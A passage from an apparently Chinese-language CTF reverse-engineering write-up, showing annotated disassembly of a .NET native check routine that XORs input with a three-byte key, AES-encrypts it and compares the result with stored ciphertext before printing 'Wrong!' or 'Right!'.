class="keyword">imul</span>    <span class="built_in">r14d</span>				//<span class="built_in">edx</span>,<span class="built_in">eax</span> = n*<span class="built_in">r14d</span>，这里<span class="built_in">edx</span>为高位<span class="number">0xFFFFFFFF</span>，<span class="built_in">eax</span>为低位</span><br><span class="line">3b68: <span class="number">41</span> <span class="number">03</span> d6                  <span class="keyword">add</span>     <span class="built_in">edx</span>, <span class="built_in">r14d</span>				//<span class="built_in">edx</span> = <span class="number">0xFFFFFFFF</span> + <span class="built_in">r14d</span></span><br><span class="line">3b6b: <span class="number">44</span> 8b c2                  <span class="keyword">mov</span>     <span class="built_in">r8d</span>, <span class="built_in">edx</span>				//<span class="built_in">r8d</span> = <span class="number">0xFFFFFFFF</span> + <span class="built_in">r14d</span></span><br><span class="line">3b6e: <span class="number">41</span> c1 e8 1f               <span class="keyword">shr</span>     <span class="built_in">r8d</span>, <span class="number">31</span>				//<span class="built_in">r8d</span> = <span class="number">0</span></span><br><span class="line">3b72: c1 fa <span class="number">06</span>                  <span class="keyword">sar</span>     <span class="built_in">edx</span>, <span class="number">6</span>				//<span class="built_in">edx</span> = <span class="number">0</span></span><br><span class="line">3b75: <span class="number">41</span> <span class="number">03</span> d0                  <span class="keyword">add</span>     <span class="built_in">edx</span>, <span class="built_in">r8d</span>				//<span class="built_in">edx</span> = <span class="number">0</span></span><br><span class="line">3b78: 6b c2 7f                  <span class="keyword">imul</span>    <span class="built_in">eax</span>, <span class="built_in">edx</span>, <span class="number">127</span>				//<span class="built_in">eax</span> = <span class="number">0</span></span><br><span class="line">3b7b: <span class="number">44</span> 2b f0                  <span class="keyword">sub</span>     <span class="built_in">r14d</span>, <span class="built_in">eax</span>				//<span class="built_in">r14d</span> = <span class="built_in">r14d</span></span><br><span class="line">3b7e: <span class="number">41</span> ff c6                  <span class="keyword">inc</span>     <span class="built_in">r14d</span>				//<span class="built_in">r14d</span> += <span class="number">1</span>，上述无意义运算等效于<span class="built_in">r14d</span>自增</span><br><span class="line">3b81: ff c1                     <span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line">3b83: 3b d9                     <span class="keyword">cmp</span>     <span class="built_in">ebx</span>, <span class="built_in">ecx</span></span><br><span class="line">3b85: 7f c3                     <span class="keyword">jg</span>      <span class="number">0x3b4a</span></span><br><span class="line">                                <span class="built_in">RDI</span> is dead</span><br><span class="line">3b87: eb 4a                     <span class="keyword">jmp</span>     <span class="number">0x3bd3</span></span><br><span class="line">                                <span class="built_in">RDI</span> is live</span><br><span class="line">3b89: <span class="number">48</span> <span class="number">63</span> c1                  <span class="keyword">movsxd</span>  <span class="built_in">rax</span>, <span class="built_in">ecx</span></span><br><span class="line">3b8c: 0f b6 <span class="number">44</span> <span class="number">07</span> <span class="number">10</span>            <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="built_in">rax</span> + <span class="number">16</span>]</span><br><span class="line">3b91: <span class="number">41</span> <span class="number">33</span> c6                  <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">r14d</span></span><br><span class="line">3b94: <span class="number">44</span> 0f b6 c0               <span class="keyword">movzx</span>   <span class="built_in">r8d</span>, <span class="built_in">al</span></span><br><span class="line">3b98: <span class="number">44</span> 8b <span class="number">65</span> <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">r12d</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + <span class="number">8</span>]</span><br><span class="line">3b9c: <span class="number">41</span> 3b cc                  <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="built_in">r12d</span></span><br><span class="line">3b9f: 0f <span class="number">83</span> e0 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">jae</span>     <span class="number">0x3e85</span></span><br><span class="line">3ba5: <span class="number">48</span> <span class="number">63</span> c1                  <span class="keyword">movsxd</span>  <span class="built_in">rax</span>, <span class="built_in">ecx</span></span><br><span class="line">3ba8: <span class="number">44</span> <span class="number">88</span> <span class="number">44</span> <span class="number">05</span> <span class="number">10</span>            <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + <span class="built_in">rax</span> + <span class="number">16</span>], <span class="built_in">r8b</span></span><br><span class="line">3bad: ba <span class="number">09</span> <span class="number">04</span> <span class="number">02</span> <span class="number">81</span>            <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">2164392969</span></span><br><span class="line">3bb2: 8b c2                     <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line">3bb4: <span class="number">41</span> f7 ee                  <span class="keyword">imul</span>    <span class="built_in">r14d</span></span><br><span class="line">3bb7: <span class="number">41</span> <span class="number">03</span> d6                  <span class="keyword">add</span>     <span class="built_in">edx</span>, <span class="built_in">r14d</span></span><br><span class="line">3bba: 8b c2                     <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line">3bbc: c1 e8 1f                  <span class="keyword">shr</span>     <span class="built_in">eax</span>, <span class="number">31</span></span><br><span class="line">3bbf: c1 fa <span class="number">06</span>                  <span class="keyword">sar</span>     <span class="built_in">edx</span>, <span class="number">6</span></span><br><span class="line">3bc2: <span class="number">03</span> c2                     <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line">3bc4: 6b c0 7f                  <span class="keyword">imul</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>, <span class="number">127</span></span><br><span class="line">3bc7: <span class="number">44</span> 2b f0                  <span class="keyword">sub</span>     <span class="built_in">r14d</span>, <span class="built_in">eax</span></span><br><span class="line">3bca: <span class="number">41</span> ff c6                  <span class="keyword">inc</span>     <span class="built_in">r14d</span></span><br><span class="line">3bcd: ff c1                     <span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line">3bcf: 3b d9                     <span class="keyword">cmp</span>     <span class="built_in">ebx</span>, <span class="built_in">ecx</span></span><br><span class="line">3bd1: 7f b6                     <span class="keyword">jg</span>      <span class="number">0x3b89</span></span><br><span class="line">                                <span class="built_in">RDI</span> is dead</span><br><span class="line">3bd3: <span class="number">44</span> 8b <span class="number">65</span> <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">r12d</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + <span class="number">8</span>]</span><br><span class="line">3bd7: <span class="number">49</span> <span class="number">63</span> cc                  <span class="keyword">movsxd</span>  <span class="built_in">rcx</span>, <span class="built_in">r12d</span></span><br><span class="line">3bda: ff <span class="number">15</span> <span class="number">88</span> <span class="number">85</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c168</span>]   // <span class="built_in">byte</span>[] (NEW_ARRAY)</span><br><span class="line">                                <span class="built_in">RAX</span> is live</span><br><span class="line">3be0: <span class="number">48</span> 8b c8                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rax</span></span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3be3: <span class="number">45</span> <span class="number">33</span> c0                  <span class="keyword">xor</span>     <span class="built_in">r8d</span>, <span class="built_in">r8d</span></span><br><span class="line">3be6: <span class="number">45</span> <span class="number">85</span> e4                  <span class="keyword">test</span>    <span class="built_in">r12d</span>, <span class="built_in">r12d</span></span><br><span class="line">3be9: 0f 8e <span class="number">9d</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">jle</span>     <span class="number">0x3c8c</span></span><br><span class="line">3bef: <span class="number">44</span> <span class="number">39</span> <span class="number">61</span> <span class="number">08</span>               <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span> + <span class="number">8</span>], <span class="built_in">r12d</span></span><br><span class="line">3bf3: 7c <span class="number">46</span>                     <span class="keyword">jl</span>      <span class="number">0x3c3b</span></span><br><span class="line">                                <span class="built_in">RAX</span> is dead</span><br><span class="line">3bf5: <span class="number">4d</span> <span class="number">63</span> c8                  <span class="keyword">movsxd</span>  <span class="built_in">r9</span>, <span class="built_in">r8d</span></span><br><span class="line">3bf8: <span class="number">46</span> 0f b6 <span class="number">54</span> <span class="number">0d</span> <span class="number">10</span>         <span class="keyword">movzx</span>   <span class="built_in">r10d</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + <span class="built_in">r9</span> + <span class="number">16</span>]</span><br><span class="line">3bfe: ba <span class="number">56</span> <span class="number">55</span> <span class="number">55</span> <span class="number">55</span>            <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">1431655766</span></span><br><span class="line">3c03: 8b c2                     <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line">3c05: <span class="number">41</span> f7 e8                  <span class="keyword">imul</span>    <span class="built_in">r8d</span></span><br><span class="line">3c08: 8b c2                     <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line">3c0a: c1 e8 1f                  <span class="keyword">shr</span>     <span class="built_in">eax</span>, <span class="number">31</span>				//用乘法实现了模<span class="number">3</span>索引</span><br><span class="line">3c0d: <span class="number">03</span> c2                     <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line">3c0f: <span class="number">8d</span> <span class="number">04</span> <span class="number">40</span>                  <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">rax</span> + <span class="number">2</span>*<span class="built_in">rax</span>]</span><br><span class="line">3c12: <span class="number">41</span> 8b d0                  <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">r8d</span></span><br><span class="line">3c15: 2b d0                     <span class="keyword">sub</span>     <span class="built_in">edx</span>, <span class="built_in">eax</span></span><br><span class="line">3c17: <span class="number">83</span> fa <span class="number">03</span>                  <span class="keyword">cmp</span>     <span class="built_in">edx</span>, <span class="number">3</span></span><br><span class="line">3c1a: 0f <span class="number">83</span> <span class="number">65</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">jae</span>     <span class="number">0x3e85</span></span><br><span class="line">3c20: <span class="number">48</span> <span class="number">63</span> c2                  <span class="keyword">movsxd</span>  <span class="built_in">rax</span>, <span class="built_in">edx</span></span><br><span class="line">3c23: <span class="number">45</span> 0f b6 5c <span class="number">07</span> <span class="number">10</span>         <span class="keyword">movzx</span>   <span class="built_in">r11d</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">r15</span> + <span class="built_in">rax</span> + <span class="number">16</span>]</span><br><span class="line">3c29: <span class="number">45</span> <span class="number">33</span> d3                  <span class="keyword">xor</span>     <span class="built_in">r10d</span>, <span class="built_in">r11d</span>				//和密钥的对应索引进行异或</span><br><span class="line">3c2c: <span class="number">46</span> <span class="number">88</span> <span class="number">54</span> <span class="number">09</span> <span class="number">10</span>            <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span> + <span class="built_in">r9</span> + <span class="number">16</span>], <span class="built_in">r10b</span></span><br><span class="line">3c31: <span class="number">41</span> ff c0                  <span class="keyword">inc</span>     <span class="built_in">r8d</span></span><br><span class="line">3c34: <span class="number">45</span> 3b e0                  <span class="keyword">cmp</span>     <span class="built_in">r12d</span>, <span class="built_in">r8d</span></span><br><span class="line">3c37: 7f bc                     <span class="keyword">jg</span>      <span class="number">0x3bf5</span></span><br><span class="line">                                <span class="built_in">RBP</span> is dead</span><br><span class="line">                                <span class="built_in">R15</span> is dead</span><br><span class="line">3c39: eb <span class="number">51</span>                     <span class="keyword">jmp</span>     <span class="number">0x3c8c</span></span><br><span class="line">                                <span class="built_in">R15</span> is live</span><br><span class="line">                                <span class="built_in">RBP</span> is live</span><br><span class="line">3c3b: <span class="number">49</span> <span class="number">63</span> c0                  <span class="keyword">movsxd</span>  <span class="built_in">rax</span>, <span class="built_in">r8d</span></span><br><span class="line">3c3e: <span class="number">44</span> 0f b6 <span class="number">54</span> <span class="number">05</span> <span class="number">10</span>         <span class="keyword">movzx</span>   <span class="built_in">r10d</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + <span class="built_in">rax</span> + <span class="number">16</span>]</span><br><span class="line">3c44: ba <span class="number">56</span> <span class="number">55</span> <span class="number">55</span> <span class="number">55</span>            <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">1431655766</span></span><br><span class="line">3c49: 8b c2                     <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line">3c4b: <span class="number">41</span> f7 e8                  <span class="keyword">imul</span>    <span class="built_in">r8d</span></span><br><span class="line">3c4e: 8b c2                     <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line">3c50: c1 e8 1f                  <span class="keyword">shr</span>     <span class="built_in">eax</span>, <span class="number">31</span></span><br><span class="line">3c53: <span class="number">03</span> c2                     <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line">3c55: <span class="number">8d</span> <span class="number">04</span> <span class="number">40</span>                  <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">rax</span> + <span class="number">2</span>*<span class="built_in">rax</span>]</span><br><span class="line">3c58: <span class="number">41</span> 8b d0                  <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">r8d</span></span><br><span class="line">3c5b: 2b d0                     <span class="keyword">sub</span>     <span class="built_in">edx</span>, <span class="built_in">eax</span></span><br><span class="line">3c5d: <span class="number">83</span> fa <span class="number">03</span>                  <span class="keyword">cmp</span>     <span class="built_in">edx</span>, <span class="number">3</span></span><br><span class="line">3c60: 0f <span class="number">83</span> 1f <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">jae</span>     <span class="number">0x3e85</span></span><br><span class="line">3c66: <span class="number">48</span> <span class="number">63</span> c2                  <span class="keyword">movsxd</span>  <span class="built_in">rax</span>, <span class="built_in">edx</span></span><br><span class="line">3c69: <span class="number">41</span> 0f b6 <span class="number">44</span> <span class="number">07</span> <span class="number">10</span>         <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">r15</span> + <span class="built_in">rax</span> + <span class="number">16</span>]</span><br><span class="line">3c6f: <span class="number">44</span> <span class="number">33</span> d0                  <span class="keyword">xor</span>     <span class="built_in">r10d</span>, <span class="built_in">eax</span></span><br><span class="line">3c72: <span class="number">44</span> 3b <span class="number">41</span> <span class="number">08</span>               <span class="keyword">cmp</span>     <span class="built_in">r8d</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span> + <span class="number">8</span>]</span><br><span class="line">3c76: 0f <span class="number">83</span> <span class="number">09</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">jae</span>     <span class="number">0x3e85</span></span><br><span class="line">3c7c: <span class="number">49</span> <span class="number">63</span> c0                  <span class="keyword">movsxd</span>  <span class="built_in">rax</span>, <span class="built_in">r8d</span></span><br><span class="line">3c7f: <span class="number">44</span> <span class="number">88</span> <span class="number">54</span> <span class="number">01</span> <span class="number">10</span>            <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span> + <span class="built_in">rax</span> + <span class="number">16</span>], <span class="built_in">r10b</span></span><br><span class="line">3c84: <span class="number">41</span> ff c0                  <span class="keyword">inc</span>     <span class="built_in">r8d</span></span><br><span class="line">3c87: <span class="number">45</span> 3b e0                  <span class="keyword">cmp</span>     <span class="built_in">r12d</span>, <span class="built_in">r8d</span></span><br><span class="line">3c8a: 7f af                     <span class="keyword">jg</span>      <span class="number">0x3c3b</span></span><br><span class="line">                                <span class="built_in">RBP</span> is dead</span><br><span class="line">                                <span class="built_in">R15</span> is dead</span><br><span class="line">3c8c: ff <span class="number">15</span> be <span class="number">85</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c250</span>]   // <span class="built_in">byte</span>[] where<span class="number">.</span>QZoPKLYRExWdGJMn<span class="number">.</span>OXJTYZWRNQVKLPFm(<span class="built_in">byte</span>[]) 	//AES加密 (METHOD_ENTRY_DEF_TOKEN)</span><br><span class="line">                                <span class="built_in">RAX</span> is live</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3c92: <span class="number">48</span> 8b f8                  <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span></span><br><span class="line">                                <span class="built_in">RDI</span> is live</span><br><span class="line">3c95: b9 <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>            <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="number">64</span></span><br><span class="line">3c9a: ff <span class="number">15</span> c8 <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c168</span>]   // <span class="built_in">byte</span>[] (NEW_ARRAY)</span><br><span class="line">3ca0: <span class="number">48</span> 8b d8                  <span class="keyword">mov</span>     <span class="built_in">rbx</span>, <span class="built_in">rax</span></span><br><span class="line">                                <span class="built_in">RBX</span> is live</span><br><span class="line">3ca3: <span class="number">48</span> <span class="number">8d</span> <span class="number">0d</span> 6e f9 ff ff      <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="number">0x3618</span>]				//真正的密文</span><br><span class="line">3caa: 0f <span class="number">10</span> <span class="number">01</span>                  <span class="keyword">movups</span>  <span class="built_in">xmm0</span>, xmmword <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">3cad: 0f <span class="number">11</span> <span class="number">43</span> <span class="number">10</span>               <span class="keyword">movups</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rbx</span> + <span class="number">16</span>], <span class="built_in">xmm0</span></span><br><span class="line">3cb1: 0f <span class="number">10</span> <span class="number">41</span> <span class="number">10</span>               <span class="keyword">movups</span>  <span class="built_in">xmm0</span>, xmmword <span class="built_in">ptr</span> [<span class="built_in">rcx</span> + <span class="number">16</span>]</span><br><span class="line">3cb5: 0f <span class="number">11</span> <span class="number">43</span> <span class="number">20</span>               <span class="keyword">movups</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rbx</span> + <span class="number">32</span>], <span class="built_in">xmm0</span></span><br><span class="line">3cb9: 0f <span class="number">10</span> <span class="number">41</span> <span class="number">20</span>               <span class="keyword">movups</span>  <span class="built_in">xmm0</span>, xmmword <span class="built_in">ptr</span> [<span class="built_in">rcx</span> + <span class="number">32</span>]</span><br><span class="line">3cbd: 0f <span class="number">11</span> <span class="number">43</span> <span class="number">30</span>               <span class="keyword">movups</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rbx</span> + <span class="number">48</span>], <span class="built_in">xmm0</span></span><br><span class="line">3cc1: 0f <span class="number">10</span> <span class="number">41</span> <span class="number">30</span>               <span class="keyword">movups</span>  <span class="built_in">xmm0</span>, xmmword <span class="built_in">ptr</span> [<span class="built_in">rcx</span> + <span class="number">48</span>]</span><br><span class="line">3cc5: 0f <span class="number">11</span> <span class="number">43</span> <span class="number">40</span>               <span class="keyword">movups</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rbx</span> + <span class="number">64</span>], <span class="built_in">xmm0</span></span><br><span class="line">3cc9: 8b 6f <span class="number">08</span>                  <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="number">8</span>]</span><br><span class="line">3ccc: <span class="number">83</span> fd <span class="number">40</span>                  <span class="keyword">cmp</span>     <span class="built_in">ebp</span>, <span class="number">64</span></span><br><span class="line">3ccf: <span class="number">74</span> <span class="number">18</span>                     <span class="keyword">je</span>      <span class="number">0x3ce9</span></span><br><span class="line">                                <span class="built_in">RAX</span> is dead</span><br><span class="line">3cd1: <span class="number">48</span> 8b <span class="number">0d</span> <span class="number">70</span> <span class="number">88</span> <span class="number">01</span> <span class="number">00</span>      <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c548</span>] // <span class="string">&quot;Wrong!&quot;</span> (STRING_HANDLE)		//长度检测</span><br><span class="line">3cd8: <span class="number">48</span> 8b <span class="number">09</span>                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3cdb: ff <span class="number">15</span> d7 <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1b8</span>]   // void System<span class="number">.</span>Console<span class="number">.</span>WriteLine(string) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3ce1: <span class="number">33</span> c9                     <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line">3ce3: ff <span class="number">15</span> f7 <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1e0</span>]   // void System<span class="number">.</span>Environment<span class="number">.</span>Exit(<span class="keyword">int</span>) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">3ce9: <span class="number">45</span> <span class="number">33</span> f6                  <span class="keyword">xor</span>     <span class="built_in">r14d</span>, <span class="built_in">r14d</span></span><br><span class="line">3cec: <span class="number">85</span> ed                     <span class="keyword">test</span>    <span class="built_in">ebp</span>, <span class="built_in">ebp</span></span><br><span class="line">3cee: 7e <span class="number">70</span>                     <span class="keyword">jle</span>     <span class="number">0x3d60</span></span><br><span class="line">3cf0: <span class="number">83</span> fd <span class="number">40</span>                  <span class="keyword">cmp</span>     <span class="built_in">ebp</span>, <span class="number">64</span></span><br><span class="line">3cf3: 7f <span class="number">30</span>                     <span class="keyword">jg</span>      <span class="number">0x3d25</span></span><br><span class="line">3cf5: <span class="number">49</span> <span class="number">63</span> ce                  <span class="keyword">movsxd</span>  <span class="built_in">rcx</span>, <span class="built_in">r14d</span></span><br><span class="line">3cf8: 0f b6 <span class="number">44</span> 0f <span class="number">10</span>            <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="built_in">rcx</span> + <span class="number">16</span>]</span><br><span class="line">3cfd: 3a <span class="number">44</span> <span class="number">0b</span> <span class="number">10</span>               <span class="keyword">cmp</span>     <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbx</span> + <span class="built_in">rcx</span> + <span class="number">16</span>]</span><br><span class="line">3d01: <span class="number">74</span> <span class="number">18</span>                     <span class="keyword">je</span>      <span class="number">0x3d1b</span></span><br><span class="line">3d03: <span class="number">48</span> 8b <span class="number">0d</span> 3e <span class="number">88</span> <span class="number">01</span> <span class="number">00</span>      <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c548</span>] // <span class="string">&quot;Wrong!&quot;</span> (STRING_HANDLE)			//内容检测</span><br><span class="line">3d0a: <span class="number">48</span> 8b <span class="number">09</span>                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3d0d: ff <span class="number">15</span> a5 <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1b8</span>]   // void System<span class="number">.</span>Console<span class="number">.</span>WriteLine(string) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3d13: <span class="number">33</span> c9                     <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line">3d15: ff <span class="number">15</span> c5 <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1e0</span>]   // void System<span class="number">.</span>Environment<span class="number">.</span>Exit(<span class="keyword">int</span>) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">3d1b: <span class="number">41</span> ff c6                  <span class="keyword">inc</span>     <span class="built_in">r14d</span></span><br><span class="line">3d1e: <span class="number">41</span> 3b ee                  <span class="keyword">cmp</span>     <span class="built_in">ebp</span>, <span class="built_in">r14d</span></span><br><span class="line">3d21: 7f d2                     <span class="keyword">jg</span>      <span class="number">0x3cf5</span></span><br><span class="line">                                <span class="built_in">RBX</span> is dead</span><br><span class="line">                                <span class="built_in">RDI</span> is dead</span><br><span class="line">3d23: eb 3b                     <span class="keyword">jmp</span>     <span class="number">0x3d60</span></span><br><span class="line">                                <span class="built_in">RBX</span> is live</span><br><span class="line">                                <span class="built_in">RDI</span> is live</span><br><span class="line">3d25: <span class="number">49</span> <span class="number">63</span> ce                  <span class="keyword">movsxd</span>  <span class="built_in">rcx</span>, <span class="built_in">r14d</span></span><br><span class="line">3d28: 0f b6 4c 0f <span class="number">10</span>            <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="built_in">rcx</span> + <span class="number">16</span>]</span><br><span class="line">3d2d: <span class="number">41</span> <span class="number">83</span> fe <span class="number">40</span>               <span class="keyword">cmp</span>     <span class="built_in">r14d</span>, <span class="number">64</span></span><br><span class="line">3d31: 0f <span class="number">83</span> 4e <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">jae</span>     <span class="number">0x3e85</span></span><br><span class="line">3d37: <span class="number">49</span> <span class="number">63</span> c6                  <span class="keyword">movsxd</span>  <span class="built_in">rax</span>, <span class="built_in">r14d</span></span><br><span class="line">3d3a: 3a 4c <span class="number">03</span> <span class="number">10</span>               <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbx</span> + <span class="built_in">rax</span> + <span class="number">16</span>]</span><br><span class="line">3d3e: <span class="number">74</span> <span class="number">18</span>                     <span class="keyword">je</span>      <span class="number">0x3d58</span></span><br><span class="line">3d40: <span class="number">48</span> 8b <span class="number">0d</span> <span class="number">01</span> <span class="number">88</span> <span class="number">01</span> <span class="number">00</span>      <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c548</span>] // <span class="string">&quot;Wrong!&quot;</span> (STRING_HANDLE)</span><br><span class="line">3d47: <span class="number">48</span> 8b <span class="number">09</span>                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3d4a: ff <span class="number">15</span> <span class="number">68</span> <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1b8</span>]   // void System<span class="number">.</span>Console<span class="number">.</span>WriteLine(string) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">                                <span class="built_in">RCX</span> is dead</span><br><span class="line">3d50: <span class="number">33</span> c9                     <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line">3d52: ff <span class="number">15</span> <span class="number">88</span> <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c1e0</span>]   // void System<span class="number">.</span>Environment<span class="number">.</span>Exit(<span class="keyword">int</span>) (METHOD_ENTRY_REF_TOKEN)</span><br><span class="line">3d58: <span class="number">41</span> ff c6                  <span class="keyword">inc</span>     <span class="built_in">r14d</span></span><br><span class="line">3d5b: <span class="number">41</span> 3b ee                  <span class="keyword">cmp</span>     <span class="built_in">ebp</span>, <span class="built_in">r14d</span></span><br><span class="line">3d5e: 7f c5                     <span class="keyword">jg</span>      <span class="number">0x3d25</span></span><br><span class="line">                                <span class="built_in">RDI</span> is dead</span><br><span class="line">                                <span class="built_in">RBX</span> is dead</span><br><span class="line">3d60: <span class="number">48</span> 8b <span class="number">0d</span> e9 <span class="number">87</span> <span class="number">01</span> <span class="number">00</span>      <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x1c550</span>] // <span class="string">&quot;Right!&quot;</span> (STRING_HANDLE)				//检测相等</span><br><span class="line">3d67: <span class="number">48</span> 8b <span class="number">09</span>                  <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rcx</span>]</span><br><span class="line">                                <span class="built_in">RCX</span> is live</span><br><span class="line">3d6a: ff <span class="number">15</span> <span class="number">48</span> <span class="number">84</span> <span class="number">01</span> <span class="number">00</span>         